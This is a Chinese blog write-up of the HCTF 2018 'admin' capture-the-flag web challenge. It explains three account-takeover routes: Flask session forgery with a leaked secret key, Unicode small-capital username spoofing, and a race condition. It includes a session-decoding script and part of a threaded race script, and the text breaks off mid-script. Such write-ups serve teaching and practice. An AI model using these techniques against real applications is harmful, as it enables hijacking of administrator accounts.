@@ -1,0 +1,538 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Bsmslwx">
+  <meta name="keywords" content="">
+  
+  <title>HCTF 2018_admin 1 ~ BsmslwxBlog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":80,"cursorChar":".","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Bsmslwx</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg4.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="HCTF 2018_admin 1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-18 20:02" pubdate>
+        2021年4月18日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">HCTF 2018_admin 1</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年7月15日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="HCTF-2018-admin-1"><a href="#HCTF-2018-admin-1" class="headerlink" title="[HCTF 2018]admin 1"></a>[HCTF 2018]admin 1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>总结一下3个做法：</p>
+<ul>
+<li>法1：伪造session</li>
+<li>法2：unicode欺骗</li>
+<li>法3：条件竞争</li>
+</ul>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>f12查看源代码</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>发现提示要成为admin</p>
+<p>随便注册个账号，登入后，在</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">view</span>-<span class="hljs-keyword">source</span>:http://admin.<span class="hljs-number">2018</span>.hctf.io/<span class="hljs-keyword">change</span><br></code></pre></div></td></tr></table></figure>
+
+<p>发现提示</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>于是下载源码</p>
+<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h2><p>拿到代码后，简单的查看了下路由</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br></code></pre></div></td></tr></table></figure>
+
+<p>查看一下路由，功能非常单一：登录，改密码，退出，注册，edit。</p>
+<p>但edit功能也是个假功能，并且发现并不会存在sql注入之类的问题，也没有文件写入或者是一些危险的函数，此时陷入了困境。</p>
+<h2 id="解法一：session伪造"><a href="#解法一：session伪造" class="headerlink" title="解法一：session伪造"></a>解法一：session伪造</h2><h3 id="初步探索"><a href="#初步探索" class="headerlink" title="初步探索"></a>初步探索</h3><p>想到的第一个方法：session伪造</p>
+<p>于是尝试伪造session，根据ph写的文章</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.leavesongs.com<span class="hljs-regexp">/PENETRATION/</span>client-session-security.html<br></code></pre></div></td></tr></table></figure>
+
+<p>可以知道flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p>
+<p>所以我们构造脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer<br><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span><br>    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br><br>    decompress = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):<br>        payload = payload[<span class="hljs-number">1</span>:]<br>        decompress = <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">try</span>:<br>        payload = base64_decode(payload)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span><br>                         <span class="hljs-string">&#x27;an exception&#x27;</span>)<br><br>    <span class="hljs-keyword">if</span> decompress:<br>        <span class="hljs-keyword">try</span>:<br>            payload = zlib.decompress(payload)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span><br>                             <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)<br><br>    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(decryption(sys.argv[<span class="hljs-number">1</span>].encode()))<br></code></pre></div></td></tr></table></figure>
+
+<p>然后可以尝试读取我们的session内容</p>
+<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t01d379cb422b901767.png"><img src="https://p5.ssl.qhimg.com/t01d379cb422b901767.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>此时容易想到伪造admin得到flag，因为看到代码中</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t017e7e3269015fdfd8.png"><img src="https://p2.ssl.qhimg.com/t017e7e3269015fdfd8.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>想到把name伪造为admin，于是github上找了个脚本</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/noraj/</span>flask-session-cookie-manager<br></code></pre></div></td></tr></table></figure>
+
+<p>尝试伪造</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;<span class="hljs-string">u&#x27;csrf_token&#x27;</span>: <span class="hljs-string">&#x27;bedddc7469bf16ac02ffd69664abb7abf7e3529c&#x27;</span>, <span class="hljs-string">u&#x27;user_id&#x27;</span>: <span class="hljs-string">u&#x27;1&#x27;</span>, <span class="hljs-string">u&#x27;name&#x27;</span>: <span class="hljs-string">u&#x27;admin&#x27;</span>, <span class="hljs-string">u&#x27;image&#x27;</span>: <span class="hljs-string">&#x27;aHme&#x27;</span>, <span class="hljs-string">u&#x27;_fresh&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">u&#x27;_id&#x27;</span>: <span class="hljs-string">&#x27;26a01e32366425679ab7738579d3ef6795cad198cd94529cb495fcdccc9c3c864f851207101b38feb17ea8e7e7d096de8cad480b656f785991abc8656938182e&#x27;</span>&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>但是需要SECRET_KEY</p>
+<p>我们发现config.py中存在</p>
+<figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">SECRET_KEY</span> = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) or <span class="hljs-string">&#x27;ckj123&#x27;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>于是尝试ckj123</p>
+<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t011f2f495345b7b523.png"><img src="https://p3.ssl.qhimg.com/t011f2f495345b7b523.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>但是比赛的时候很遗憾，最后以失败告终，当时以为key不是SECRET_KEY，就没有深究</p>
+<p>后来发现问题<a target="_blank" rel="noopener" href="https://graneed.hatenablog.com/entry/2018/11/11/212048">https://graneed.hatenablog.com/entry/2018/11/11/212048</a></p>
+<p>似乎python3和python2的flask session生成机制不同</p>
+<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t01ccc362b56b3fc055.png"><img src="https://p5.ssl.qhimg.com/t01ccc362b56b3fc055.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>改用python3生成即可成功伪造管理员</p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t01312c49a0bdefdff2.png"><img src="https://p1.ssl.qhimg.com/t01312c49a0bdefdff2.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h2 id="解法二：Unicode欺骗"><a href="#解法二：Unicode欺骗" class="headerlink" title="解法二：Unicode欺骗"></a>解法二：Unicode欺骗</h2><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>在非常迷茫的时候，肯定想到必须得结合改密码功能，那会不会是change这里有问题，于是仔细去看代码，发现这样一句</p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t01a62718e1f4b58647.png"><img src="https://p1.ssl.qhimg.com/t01a62718e1f4b58647.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>好奇怪，为什么要转小写呢？</p>
+<p>难道注册的时候没有转大小写吗？</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t0185c9b99610dec9e3.png"><img src="https://p0.ssl.qhimg.com/t0185c9b99610dec9e3.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t0142ed79c38e510873.png"><img src="https://p2.ssl.qhimg.com/t0142ed79c38e510873.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>但随后发现注册和登录都用了转小写，注册ADMIN的计划失败</p>
+<p>但是又有一个特别的地方，我们python转小写一般用的都是lower()，为什么这里是strlower()?</p>
+<p>有没有什么不一样的地方呢？于是想到跟进一下函数</p>
+<figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">def <span class="hljs-title">strlower</span><span class="hljs-params">(username)</span>:</span><br><span class="hljs-function">    username =</span> nodeprep.<span class="hljs-built_in">prepare</span>(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></div></td></tr></table></figure>
+
+<p>本能的去研究了一下nodeprep.prepare</p>
+<p>找到对应的库</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/twisted/</span>twisted<br></code></pre></div></td></tr></table></figure>
+
+<p>这个方法很容易懂，即将大写字母转为小写</p>
+<p>但是很快就容易发现问题</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t01c3ca861181957082.png"><img src="https://p2.ssl.qhimg.com/t01c3ca861181957082.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://p5.ssl.qhimg.com/t01ece0c53877fc0052.png"><img src="https://p5.ssl.qhimg.com/t01ece0c53877fc0052.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>版本差的可真多，十有八九这里有猫腻</p>
+<h3 id="unicode问题"><a href="#unicode问题" class="headerlink" title="unicode问题"></a>unicode问题</h3><p>后来搜到这样一篇文章</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://tw.saowen.com/a/<span class="hljs-number">72</span>b<span class="hljs-number">7816</span>b<span class="hljs-number">29</span>ef<span class="hljs-number">30533882</span>a<span class="hljs-number">07</span>a<span class="hljs-number">4</span>e<span class="hljs-number">1040</span>f<span class="hljs-number">696</span>b<span class="hljs-number">01</span>e<span class="hljs-number">7888</span>d<span class="hljs-number">60255</span>ab<span class="hljs-number">89</span>d<span class="hljs-number">37</span>cf<span class="hljs-number">2</span>f<span class="hljs-number">18</span>f<span class="hljs-number">3</span>e<br></code></pre></div></td></tr></table></figure>
+
+<p>对于如下字母</p>
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t01b1cdb8fd0fdb6a3c.png"><img src="https://p1.ssl.qhimg.com/t01b1cdb8fd0fdb6a3c.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ<br></code></pre></div></td></tr></table></figure>
+
+<p>具体编码可查<a target="_blank" rel="noopener" href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a></p>
+<p>nodeprep.prepare会进行如下操作</p>
+<figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">ᴀ -&gt; A -&gt; a<br></code></pre></div></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png"><img src="https://p1.ssl.qhimg.com/t01e6150cb114639c0d.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>即第一次将其转换为大写，第二次将其转换为小写</p>
+<p>那么是否可以用来bypass题目呢？</p>
+<h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p>我们容易想到一个攻击链：</p>
+<ul>
+<li>注册用户ᴀdmin</li>
+<li>登录用户ᴀdmin，变成Admin</li>
+<li>修改密码Admin，更改了admin的密码</li>
+</ul>
+<p>于是成功得到如下flag</p>
+<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t01ff30572eb8252865.png"><img src="https://p4.ssl.qhimg.com/t01ff30572eb8252865.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>这里的unicode欺骗，让我想起了一道sql注入题目</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">skysec.top<span class="hljs-regexp">/2018/</span><span class="hljs-number">03</span><span class="hljs-regexp">/21/</span>从一道题深入mysql字符集与比对方法collation/<br></code></pre></div></td></tr></table></figure>
+
+<h2 id="解法三：条件竞争"><a href="#解法三：条件竞争" class="headerlink" title="解法三：条件竞争"></a>解法三：条件竞争</h2><p>该方法也是赛后交流才发现的，感觉有点意思</p>
+<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>我们发现代码在处理session赋值的时候</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t015483fb615c3f782b.png"><img src="https://p2.ssl.qhimg.com/t015483fb615c3f782b.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://p4.ssl.qhimg.com/t0169918a9c850e8ec9.png"><img src="https://p4.ssl.qhimg.com/t0169918a9c850e8ec9.png" srcset="/img/loading.gif" lazyload alt="img"></a><br> 两个危险操作，一个登陆一个改密码，都是在不安全check身份的情况下，直接先赋值了session</p>
+<p>那么这里就会存在一些风险</p>
+<p>那么我们设想，能不能利用这一点，改掉admin的密码呢？</p>
+<p>例如：</p>
+<ul>
+<li>我们登录sky用户，得到session a</li>
+<li>用session a去登录触发admin赋值</li>
+<li>改密码，此时session a已经被更改为session b了，即session name=admin</li>
+<li>成功更改admin的密码</li>
+</ul>
+<p>但是构想是美好的，这里存在问题，即前两步中，如果我们的Session a是登录后的，那么是无法再去登录admin的</p>
+<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/t019e3bbbe0d730d41d.png"><img src="https://p2.ssl.qhimg.com/t019e3bbbe0d730d41d.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>我们会在第一步直接跳转，所以这里需要条件竞争</p>
+<h3 id="条件竞争思路"><a href="#条件竞争思路" class="headerlink" title="条件竞争思路"></a>条件竞争思路</h3><p>那么能不能避开这个check呢？</p>
+<p>答案是显然的，我们双线并进</p>
+<p>当我们的一个进程运行到改密码</p>
+<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/t01d48a760805ea0e10.png"><img src="https://p0.ssl.qhimg.com/t01d48a760805ea0e10.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>这里的时候</p>
+<p>我们的另一个进程正好退出了这个用户，并且来到了登录的这个位置</p>
+<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/t018dad3539436692a9.png"><img src="https://p3.ssl.qhimg.com/t018dad3539436692a9.png" srcset="/img/loading.gif" lazyload alt="img"></a></p>
+<p>此时正好session name变为admin，change密码正好更改了管理员密码</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>这里直接用研友syang<a target="_blank" rel="noopener" href="https://github.com/Whitzard">@Whitzard</a>的脚本了</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>(<span class="hljs-params">s, username, password</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;username&#x27;</span>: username,<br>        <span class="hljs-string">&#x27;password&#x27;</span>: password,<br>        <span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> s.post(<span class="hljs-string">&quot;http://admin.2018.hctf.io/login&quot;</span>, data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>(<span class="hljs-params">s</span>):</span><br>    <span class="hljs-keyword">return</span> s.get(<span class="hljs-string">&quot;http://admin.2018.hctf.io/logout&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">s, newpassword</span>):</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;newpassword&#x27;</span>:newpassword<br>    &#125;<br>    <span class="hljs-keyword">return</span> s.post(<span class="hljs-string">&quot;http://admin.2018.hctf.io/change&quot;</span>, data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func1</span>(<span class="hljs-params">s</span>):</span><br>    login(s, <span class="hljs-string">&#x27;skysec&#x27;</span>, <span class="hljs-string">&#x27;skysec&#x27;</span>)<br>    change(s, <span class="hljs-string">&#x27;skysec&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func2</span>(<span class="hljs-params">s</span>):</span><br>    logout(s)<br>    res = login(s, <span class="hljs-string">&#x27;admin&#x27;</span>, <span 